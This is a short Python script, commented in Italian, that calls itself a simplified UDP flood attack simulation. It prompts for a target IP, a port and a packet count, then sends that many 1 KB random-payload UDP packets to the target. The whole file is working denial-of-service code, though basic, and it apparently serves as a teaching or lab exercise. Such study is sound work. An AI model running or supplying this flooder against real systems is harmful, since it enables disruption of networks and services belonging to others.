import socket
import random

def udp_flood():
    """
    Funzione per simulare un attacco UDP Flood semplificato.
    """
    target_ip = input("Inserisci l'IP della macchina target: ")
    target_port = int(input("Inserisci la porta UDP della macchina target: "))
    num_packets = int(input("Inserisci il numero di pacchetti da inviare: "))

    # Creazione del socket UDP
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Pacchetto di 1 KB (1024 byte)
    packet_size = 1024
    packet = random.randbytes(packet_size)

    print(f"Inizio invio di {num_packets} pacchetti UDP verso {target_ip}:{target_port}...")

    try:
        for i in range(num_packets):
            client_socket.sendto(packet, (target_ip, target_port))
            print(f"Pacchetto {i + 1} inviato.")

        print("Invio completato!")

    except Exception as e:
        print(f"Errore durante l'invio dei pacchetti: {e}")

    finally:
        client_socket.close()

if __name__ == "__main__":
    udp_flood()
